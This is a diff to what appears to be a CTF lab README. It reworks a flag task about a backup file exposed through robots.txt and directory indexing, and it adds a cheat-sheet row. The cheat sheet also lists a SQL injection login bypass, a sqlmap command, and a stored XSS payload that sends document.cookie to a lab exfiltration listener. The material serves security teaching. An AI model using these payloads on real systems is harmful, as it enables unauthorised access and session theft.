@@ -85,9 +85,9 @@ All flags use the standard CTF format: `flag{...}`
 
 ### 🚩 Flag 2 (Easy) — Information Disclosure / Backup File
 - **Target:** `http://webapp/`
-- **Task:** Check `robots.txt` for a disallowed path. A stale backup file
-  was left inside it. Read the file to get the flag - and a hint about
-  where to look later.
+- **Task:** Check `robots.txt` for a disallowed path. Directory indexing was
+  left enabled on that path, so browse it to find a stale backup file. Read
+  the file to get the flag - and a hint about where to look later.
 
 ---
 
@@ -139,6 +139,7 @@ All flags use the standard CTF format: `flag{...}`
 | :--- | :--- |
 | **SQLi login bypass** | `curl -X POST http://webapp/login --data-urlencode "username=admin' OR '1'='1'--" --data-urlencode "password=x"` |
 | **Check robots.txt** | `curl http://webapp/robots.txt` |
+| **Browse exposed dir** | `curl http://webapp/backup/` |
 | **Automated SQLi** | `sqlmap -u http://webapp/login --data "username=x&password=x" --dbs` |
 | **Local exfil listener** | `python3 -m http.server 8000` (run inside `week4_student`) |
 | **Stored XSS payload** | `<img src=x onerror="fetch('http://172.30.0.5:8000/steal?c='+document.cookie)">` |
